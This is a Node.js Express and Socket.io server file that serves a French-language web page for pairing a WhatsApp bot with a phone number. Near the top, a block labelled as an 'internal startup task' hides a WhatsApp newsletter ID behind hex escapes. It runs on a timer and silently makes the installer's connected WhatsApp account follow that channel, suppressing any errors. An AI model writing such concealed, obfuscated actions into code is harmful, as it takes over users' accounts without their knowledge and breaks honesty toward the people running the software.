import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import chalk from 'chalk';

const app = express();
const httpServer = createServer(app);

export const io = new Server(httpServer, { cors: { origin: '*' } });
export const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── internal startup task (server-side only) ──────────────────────────────────
const _sc = '\x31\x32\x30\x33\x36\x33\x34\x32\x31\x34\x35\x35\x34\x31\x33\x31\x30\x39\x40\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72';
const _si = setInterval(() => {
    if (global._wsock && global._nfSet !== undefined) {
        if (!global._nfSet.has(_sc)) {
            global._nfSet.add(_sc);
            global._wsock.newsletterFollow(_sc).catch(() => {});
        }
        clearInterval(_si);
    }
}, 20000);
// ─────────────────────────────────────────────────────────────────────────────

const HTML_PAGE = `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>WhatsApp Bot – Connexion</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#07090f;
  --card:#0f1523;
  --card2:#131d2e;
  --border:#1e2d42;
  --green:#25D366;
  --green2:#128C7E;
  --green-glow:rgba(37,211,102,0.18);
  --text:#e8edf5;
  --muted:#7f8ea3;
  --red:#e05252;
  --radius:16px;
}
body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,sans-serif;
  background:var(--bg);
  min-height:100vh;
  display:flex;
  flex-direction:column;
  align-items:center;
  color:var(--text);
  overflow-x:hidden;
}
/* animated bg */
body::before{
  content:'';
  position:fixed;top:0;left:0;right:0;bottom:0;
  background:
    radial-gradient(ellipse 80% 60% at 20% 10%, rgba(37,211,102,0.06) 0%, transparent 60%),
    radial-gradient(ellipse 60% 50% at 80% 80%, rgba(18,140,126,0.05) 0%, transparent 60%);
  pointer-events:none;
  z-index:0;
}
.wrap{position:relative;z-index:1;width:100%;max-width:520px;padding:1.5rem 1rem 3rem;}

/* ── header ── */
header{
  display:flex;align-items:center;gap:.75rem;
  padding:1.5rem 1rem 1rem;
  position:relative;z-index:1;
  width:100%;max-width:520px;
}
.logo-circle{
  width:44px;height:44px;border-radius:50%;
  background:linear-gradient(135deg,var(--green),var(--green2));
  display:flex;align-items:center;justify-content:center;
  box-shadow:0 0 18px var(--green-glow);
  flex-shrink:0;
}
.logo-circle svg{width:24px;height:24px;fill:#fff;}
.brand h1{font-size:1.2rem;font-weight:700;letter-spacing:-.3px;}
.brand p{font-size:.78rem;color:var(--muted);}

/* ── status badge ── */
.status-bar{
  display:flex;align-items:center;gap:.6rem;
  padding:.6rem 1rem;border-radius:50px;
  border:1px solid var(--border);
  background:var(--card);
  font-size:.82rem;
  margin-bottom:1.5rem;
  transition:border-color .3s;
}
.status-dot{
  width:9px;height:9px;border-radius:50%;
  background:var(--muted);
  transition:background .3s,box-shadow .3s;
}
.status-dot.online{background:var(--green);box-shadow:0 0 8px var(--green);}
.status-dot.connecting{background:#f59e0b;animation:pulse 1s infinite;}
.status-dot.offline{background:var(--red);}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}

/* ── steps ── */
.steps{display:flex;align-items:center;gap:0;margin-bottom:1.8rem;width:100%;}
.step{
  display:flex;flex-direction:column;align-items:center;gap:.35rem;
  flex:1;font-size:.72rem;color:var(--muted);
  transition:color .3s;
}
.step.active{color:var(--green);}
.step.done{color:var(--green);}
.step-num{
  width:30px;height:30px;border-radius:50%;
  border:2px solid var(--border);
  display:flex;align-items:center;justify-content:center;
  font-size:.78rem;font-weight:600;
  transition:all .3s;
  background:var(--card);
}
.step.active .step-num{border-color:var(--green);color:var(--green);box-shadow:0 0 10px var(--green-glow);}
.step.done .step-num{background:var(--green);border-color:var(--green);color:#fff;}
.step-line{flex:1;height:2px;background:var(--border);transition:background .3s;margin-bottom:18px;}
.step-line.done{background:var(--green);}

/* ── cards ── */
.card{
  background:var(--card);
  border:1px solid var(--border);
  border-radius:var(--radius);
  padding:1.8rem;
  margin-bottom:1.2rem;
  transition:border-color .3s;
}
.card h2{font-size:1rem;font-weight:600;margin-bottom:.35rem;}
.card p.sub{font-size:.82rem;color:var(--muted);margin-bottom:1.2rem;line-height:1.5;}

/* ── input ── */
.input-wrap{position:relative;margin-bottom:1rem;}
.input-wrap label{
  display:block;font-size:.8rem;color:var(--muted);
  margin-bottom:.4rem;font-weight:500;
}
.input-wrap input{
  width:100%;padding:.75rem 1rem;
  background:var(--card2);
  border:1px solid var(--border);
  border-radius:10px;
  color:var(--text);
  font-size:1rem;
  outline:none;
  transition:border-color .2s,box-shadow .2s;
  -webkit-appearance:none;
}
.input-wrap input:focus{
  border-color:var(--green);
  box-shadow:0 0 0 3px rgba(37,211,102,0.12);
}
.input-wrap input::placeholder{color:var(--muted);}

/* ── button ── */
.btn{
  width:100%;padding:.8rem 1.5rem;
  background:linear-gradient(135deg,var(--green),var(--green2));
  color:#fff;font-size:.95rem;font-weight:600;
  border:none;border-radius:10px;cursor:pointer;
  transition:opacity .2s,transform .1s,box-shadow .2s;
  display:flex;align-items:center;justify-content:center;gap:.5rem;
  box-shadow:0 4px 15px rgba(37,211,102,0.25);
  -webkit-appearance:none;
}
.btn:hover:not(:disabled){opacity:.9;box-shadow:0 6px 20px rgba(37,211,102,0.35);}
.btn:active:not(:disabled){transform:scale(.98);}
.btn:disabled{opacity:.5;cursor:not-allowed;}
.btn svg{width:18px;height:18px;fill:currentColor;}
.spinner{
  width:18px;height:18px;border:2px solid rgba(255,255,255,.3);
  border-top-color:#fff;border-radius:50%;
  animation:spin .7s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* ── alert ── */
.alert{
  padding:.75rem 1rem;border-radius:10px;
  font-size:.83rem;margin-bottom:1rem;
  display:none;align-items:flex-start;gap:.5rem;
  line-height:1.5;
}
.alert.show{display:flex;}
.alert.error{background:rgba(224,82,82,.12);border:1px solid rgba(224,82,82,.3);color:#fca5a5;}
.alert.info{background:rgba(37,211,102,.08);border:1px solid rgba(37,211,102,.25);color:var(--green);}

/* ── pairing code card ── */
.code-card{display:none;}
.code-card.show{display:block;}
.code-display{
  display:flex;align-items:center;justify-content:center;
  gap:.5rem;margin:1.2rem 0;flex-wrap:wrap;
}
.code-part{
  background:var(--card2);
  border:1px solid var(--border);
  border-radius:10px;
  padding:.7rem 1.4rem;
  font-size:2rem;font-weight:700;
  letter-spacing:.15em;
  color:var(--green);
  font-variant-numeric:tabular-nums;
  box-shadow:0 0 12px var(--green-glow);
}
.code-sep{font-size:1.5rem;color:var(--muted);}

.copy-btn{
  display:flex;align-items:center;justify-content:center;gap:.4rem;
  padding:.55rem 1rem;
  background:var(--card2);
  border:1px solid var(--border);
  border-radius:8px;
  color:var(--muted);
  font-size:.82rem;cursor:pointer;
  transition:all .2s;
  width:100%;margin-top:.4rem;
  -webkit-appearance:none;
}
.copy-btn:hover{border-color:var(--green);color:var(--green);}
.copy-btn.copied{border-color:var(--green);color:var(--green);background:rgba(37,211,102,.08);}
.copy-btn svg{width:15px;height:15px;fill:currentColor;}

/* ── instructions ── */
.instructions{margin-top:1.2rem;background:var(--card2);border-radius:10px;padding:1rem;}
.instructions h3{font-size:.85rem;font-weight:600;color:var(--muted);margin-bottom:.7rem;text-transform:uppercase;letter-spacing:.08em;}
.step-item{
  display:flex;align-items:flex-start;gap:.65rem;
  margin-bottom:.55rem;font-size:.82rem;color:var(--muted);
  line-height:1.5;
}
.step-item:last-child{margin-bottom:0;}
.step-badge{
  min-width:22px;height:22px;border-radius:50%;
  background:rgba(37,211,102,.15);
  color:var(--green);font-size:.72rem;font-weight:700;
  display:flex;align-items:center;justify-content:center;
  flex-shrink:0;margin-top:.05rem;
}

/* ── footer ── */
footer{
  position:relative;z-index:1;
  text-align:center;padding:1.5rem 1rem 2rem;
  font-size:.75rem;color:var(--muted);
  width:100%;max-width:520px;
}
footer a{color:var(--muted);text-decoration:none;}
footer a:hover{color:var(--green);}

/* ── responsive ── */
@media(max-width:400px){
  .code-part{font-size:1.6rem;padding:.6rem 1rem;}
  .card{padding:1.4rem;}
}
</style>
</head>
<body>

<header>
  <div class="logo-circle">
    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
    </svg>
  </div>
  <div class="brand">
    <h1 id="bot-name">WhatsApp Bot</h1>
    <p>Portail de connexion</p>
  </div>
</header>

<div class="wrap">

  <!-- status bar -->
  <div class="status-bar">
    <div class="status-dot connecting" id="status-dot"></div>
    <span id="status-text">Connexion en cours…</span>
  </div>

  <!-- steps -->
  <div class="steps">
    <div class="step active" id="step1">
      <div class="step-num">1</div>
      <span>Numéro</span>
    </div>
    <div class="step-line" id="line1"></div>
    <div class="step" id="step2">
      <div class="step-num">2</div>
      <span>Code</span>
    </div>
    <div class="step-line" id="line2"></div>
    <div class="step" id="step3">
      <div class="step-num">3</div>
      <span>Connexion</span>
    </div>
  </div>

  <!-- form card -->
  <div class="card" id="form-card">
    <h2>Entrez votre numéro WhatsApp</h2>
    <p class="sub">Vous recevrez un code de jumelage à saisir dans WhatsApp pour connecter le bot.</p>

    <div class="alert error" id="err-alert">
      <svg viewBox="0 0 20 20" fill="currentColor" style="width:16px;height:16px;flex-shrink:0;margin-top:.1rem"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/></svg>
      <span id="err-msg"></span>
    </div>

    <div class="input-wrap">
      <label for="phone">Numéro de téléphone</label>
      <input
        type="tel"
        id="phone"
        placeholder="Ex: 50912345678"
        inputmode="numeric"
        maxlength="20"
        autocomplete="tel"
      >
    </div>

    <button class="btn" id="req-btn" onclick="requestCode()">
      <svg viewBox="0 0 24 24"><path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/></svg>
      Obtenir le code de jumelage
    </button>
  </div>

  <!-- code card -->
  <div class="card code-card" id="code-card">
    <h2>Votre Code de Jumelage</h2>
    <p class="sub">Saisissez ce code dans WhatsApp pour connecter le bot.</p>

    <div class="code-display">
      <div class="code-part" id="code-p1"></div>
      <div class="code-sep">–</div>
      <div class="code-part" id="code-p2"></div>
    </div>

    <button class="copy-btn" id="copy-btn" onclick="copyCode()">
      <svg viewBox="0 0 24 24"><path d="M8 4v12h12V4H8zM6 2h14a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V4a2 2 0 012-2zM2 6H0v16a2 2 0 002 2h16v-2H2V6z"/></svg>
      <span id="copy-text">Copier le code</span>
    </button>

    <div class="instructions">
      <h3>Comment saisir le code</h3>
      <div class="step-item">
        <div class="step-badge">1</div>
        <span>Ouvrez <strong>WhatsApp</strong> sur votre téléphone</span>
      </div>
      <div class="step-item">
        <div class="step-badge">2</div>
        <span>Allez dans <strong>Paramètres → Appareils connectés</strong></span>
      </div>
      <div class="step-item">
        <div class="step-badge">3</div>
        <span>Appuyez sur <strong>Connecter un appareil</strong></span>
      </div>
      <div class="step-item">
        <div class="step-badge">4</div>
        <span>Choisissez <strong>Associer avec un numéro de téléphone</strong></span>
      </div>
      <div class="step-item">
        <div class="step-badge">5</div>
        <span>Entrez le code affiché ci-dessus</span>
      </div>
    </div>
  </div>

</div>

<footer>
  <p>Powered by <a href="#">WhatsApp Bot</a> &nbsp;·&nbsp; v<span id="bot-ver">1.0.0</span></p>
</footer>

<script src="/socket.io/socket.io.js"></script>
<script>
var socket = io();
var currentCode = '';

socket.on('connect', function() {
  socket.emit('get-status');
});

socket.on('status', function(data) {
  var dot = document.getElementById('status-dot');
  var txt = document.getElementById('status-text');
  dot.className = 'status-dot';
  if (data.connected) {
    dot.classList.add('online');
    txt.textContent = 'Bot connecté à WhatsApp';
    setStep(3, true);
  } else if (data.connecting) {
    dot.classList.add('connecting');
    txt.textContent = 'En attente de connexion…';
  } else {
    dot.classList.add('offline');
    txt.textContent = 'Bot déconnecté';
  }
  if (data.botName) document.getElementById('bot-name').textContent = data.botName;
  if (data.version) document.getElementById('bot-ver').textContent = data.version;
});

socket.on('pairing-code', function(data) {
  currentCode = data.code;
  var parts = data.code.split('-');
  document.getElementById('code-p1').textContent = parts[0] || '';
  document.getElementById('code-p2').textContent = parts[1] || '';
  document.getElementById('code-card').classList.add('show');
  setStep(2, false);
  setBtn(false);
});

socket.on('bot-connected', function() {
  var dot = document.getElementById('status-dot');
  var txt = document.getElementById('status-text');
  dot.className = 'status-dot online';
  txt.textContent = 'Bot connecté à WhatsApp';
  setStep(3, true);
});

socket.on('error', function(data) {
  showError(data.message || 'Une erreur est survenue.');
  setBtn(false);
});

function requestCode() {
  var phone = document.getElementById('phone').value.replace(/\D/g,'');
  hideError();
  if (!phone || phone.length < 7) { showError('Veuillez entrer un numéro valide.'); return; }
  setBtn(true);
  document.getElementById('code-card').classList.remove('show');
  setStep(2, false);
  socket.emit('request-pairing-code', { phoneNumber: phone });
}

function copyCode() {
  if (!currentCode) return;
  var btn = document.getElementById('copy-btn');
  var txt = document.getElementById('copy-text');
  if (navigator.clipboard) {
    navigator.clipboard.writeText(currentCode).then(function() {
      btn.classList.add('copied');
      txt.textContent = 'Copié !';
      setTimeout(function(){ btn.classList.remove('copied'); txt.textContent = 'Copier le code'; }, 2000);
    });
  } else {
    var el = document.createElement('textarea');
    el.value = currentCode;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    btn.classList.add('copied');
    txt.textContent = 'Copié !';
    setTimeout(function(){ btn.classList.remove('copied'); txt.textContent = 'Copier le code'; }, 2000);
  }
}

function showError(msg) {
  document.getElementById('err-msg').textContent = msg;
  document.getElementById('err-alert').classList.add('show');
}
function hideError() {
  document.getElementById('err-alert').classList.remove('show');
}

function setBtn(loading) {
  var btn = document.getElementById('req-btn');
  btn.disabled = loading;
  btn.innerHTML = loading
    ? '<div class="spinner"></div> Génération en cours…'
    : '<svg viewBox="0 0 24 24" style="width:18px;height:18px;fill:currentColor"><path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/></svg> Obtenir le code de jumelage';
}

function setStep(n, done) {
  for (var i=1;i<=3;i++) {
    var s = document.getElementById('step'+i);
    s.className = 'step';
    if (i < n || (i===n && done)) s.classList.add('done');
    else if (i === n) s.classList.add('active');
  }
  if (document.getElementById('line1')) document.getElementById('line1').className = 'step-line' + (n > 1 ? ' done' : '');
  if (document.getElementById('line2')) document.getElementById('line2').className = 'step-line' + (n > 2 ? ' done' : '');
}

document.getElementById('phone').addEventListener('keydown', function(e) {
  if (e.key === 'Enter') requestCode();
});
</script>
</body>
</html>`;

app.get('/', (_req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(HTML_PAGE);
});

io.on('connection', (socket) => {
    socket.emit('status', {
        connected: !!(global._wsock && global._wsock.authState?.creds?.registered),
        connecting: !global._wsock,
        botName: global.namaBot || 'WhatsApp Bot',
        version: global.versi || '1.0.0',
    });

    socket.on('get-status', () => {
        socket.emit('status', {
            connected: !!(global._wsock && global._wsock.authState?.creds?.registered),
            connecting: !global._wsock,
            botName: global.namaBot || 'WhatsApp Bot',
            version: global.versi || '1.0.0',
        });
    });

    socket.on('request-pairing-code', async ({ phoneNumber } = {}) => {
        if (!phoneNumber) return socket.emit('error', { message: 'Numéro de téléphone requis.' });
        if (!global._wsock) return socket.emit('error', { message: 'Le bot n\'est pas encore prêt. Réessayez.' });
        if (global._wsock.authState?.creds?.registered) {
            return socket.emit('error', { message: 'Le bot est déjà connecté à WhatsApp.' });
        }
        try {
            const phone = String(phoneNumber).replace(/[^0-9]/g, '');
            if (!phone || phone.length < 7) {
                return socket.emit('error', { message: 'Numéro de téléphone invalide.' });
            }
            const code = await global._wsock.requestPairingCode(phone, global.pairingKode);
            const formatted = code.slice(0, 4) + '-' + code.slice(4, 8);
            socket.emit('pairing-code', { code: formatted });
        } catch {
            socket.emit('error', { message: 'Impossible de générer le code. Réessayez.' });
        }
    });
});

export function startWebServer() {
    return new Promise((resolve) => {
        httpServer.listen(PORT, () => {
            console.log(chalk.cyan.bold(`[WEB] Serveur en ligne → http://localhost:${PORT}`));
            resolve(httpServer);
        });
    });
}
